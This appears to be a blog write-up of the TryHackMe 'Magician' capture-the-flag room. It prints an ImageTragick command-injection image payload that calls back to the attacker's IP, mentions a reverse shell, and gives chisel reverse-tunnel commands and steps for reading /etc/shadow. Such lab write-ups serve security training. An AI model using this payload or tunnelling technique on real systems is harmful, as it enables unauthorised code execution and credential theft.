Magician is a easy level room in Tryhackme. Some important points to note in this room is that the ```ssh service``` is not available in this room and eventhough I got the root password hash from the ```/etc/shadow``` file, I was not able to crack the hash and get the root shell.

Deploy the VM and let's Hack the machine.

## <ins>Enumeration</ins>
---
Before enumerating add the domain name ```magician``` to the ```/etc/hosts``` file in your local machine as provided in the description.
<br>
![etc_hosts](/assets/img/tryhackme/magician/2.png)
<br>
Let's start enumerating with the usual nmap scan.
<br>
![nmap_scan](/assets/img/tryhackme/magician/nmap_scan.png)
<br>
From the nmap scan we can see that the ports ```21/ftp```, ```8080/http-proxy``` and ```8081/http``` are open.

The first port I checked is the ```21/ftp```. At first, I thought the service took too long to respond but I found that it was made intentional.
<br>
![ftp_service](/assets/img/tryhackme/magician/3.png)
<br>

From the hint given from the ftp service, I found the webpage had to do something with converting images or manipulating images.

After visiting the webpage which works in the ```port 8081```, I confirmed my theory.
Use the url ```http://magician:8081/``` in your browser.
<br>
![http_service](/assets/img/tryhackme/magician/4.png)
<br>
From the page ```https://imagetragick.com``` I found the code to exploit. I copied the code, saved it as ```list.png``` and uploaded it.
<br>
![exploit_code](/assets/img/tryhackme/magician/6.png)
<br>
![upload_file](/assets/img/tryhackme/magician/7.png)
<br>
Then, I tried executing it, which didn't yield any result. The next thing I did is changing the command to get a ping back to my local machine.
<br>
<pre>
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/someimage.jpg"|ping -c 3" your-vpn-ip'
pop graphic-context
</pre>
<br>
Save the above code as a ```.png``` file and upload it. And in my machine I executed the command...
<br>
<pre>sudo tcpdump -i tun0 icmp</pre>
<br>
I successfully got the ping back from the machine.


<ins>User flag</ins>
----
I changed the command to get the reverse shell and did the same process again.
<br>
![reverse_payload](/assets/img/tryhackme/magician/8.png)
<br>
I started an netcat listener in my local machine, and finally uploaded the image. I got the reverse shell.
<br>
![reverse_shell](/assets/img/tryhackme/magician/9.png)
<br>
I stabilized the shell using ```python3 -c 'import pty;pty.spawn("/bin/bash")'```.

I found the user flag in the home directory of the user ```magician```.
<br>
![user_flag](/assets/img/tryhackme/magician/10.png)
<br>
Without further ado, let's also get the root flag.


<ins>Root flag</ins>
----
I found some files in the same directory which gave me a hint for getting the root flag.
<br>
![note_magician](/assets/img/tryhackme/magician/11.png)
<br>
The term ```locally listening``` rang a bell, so I checked the open ports running in the localhost of the machine using the ```ss``` utility
<br>
<pre>ss -tnlp</pre>
<br>
![ss_localhost](/assets/img/tryhackme/magician/12.png)
<br>
I found that something is running on the ```port 6666```. So, I transferred the ```chisel``` tunnelling tool to tunnel the port 6666 running on the remote machine to run in my localhost. Also make the file executable using ```chmod +x ./chisel```.
<br>
<pre>
##In the local machine
./chisel server --port 8080 --reverse

##In the remote machine
./chisel client your-vpn-ip:8080 R:8081:127.0.0.1:6666
</pre>
<br>
![server_side](/assets/img/tryhackme/magician/13.png)
<br>
![client_side1](/assets/img/tryhackme/magician/14.png)
<br>
A point to note here is that, the ```port 6666``` will be blocked by ```Firefox``` by making it restricted. This is one of the security features. If you want to disable the port restriction, a simple google search will yield the answer.

So, I changed the port to work in ```8081```.
<br>
![client_side2](/assets/img/tryhackme/magician/15.png)
<br>
Going the url ```127.0.0.1:8081``` I found this...
<br>
![localhost](/assets/img/tryhackme/magician/16.png)
<br>
I tried to get the ```root.txt``` file since the root will always be placed in the ```/root``` directory. The output showed the root flag in the ```rot13``` ciphertext. This means that the wepage is running as root.
<br>
![root_flagrot](/assets/img/tryhackme/magician/18.png)
<br>
I used ```CyberChef``` to decode the text. It is a ```ROT13``` cipher.
<br>
![root_flag](/assets/img/tryhackme/magician/19.png)
<br>
I also retrieved the ```/etc/shadow``` file which contains the password hashed of all the users.
<br>
![etc_shadow](/assets/img/tryhackme/magician/20.png)
<br>
![etc_shadow](/assets/img/tryhackme/magician/21.png)
<br>
I tried cracking it using tools such as ```hashcat``` and ```crackstation.net``` but I couldn't get the root password.

Anyways we got both the user and the root flag.

Sorry for not posting so long.

That's it folks. Happy Hacking!!!
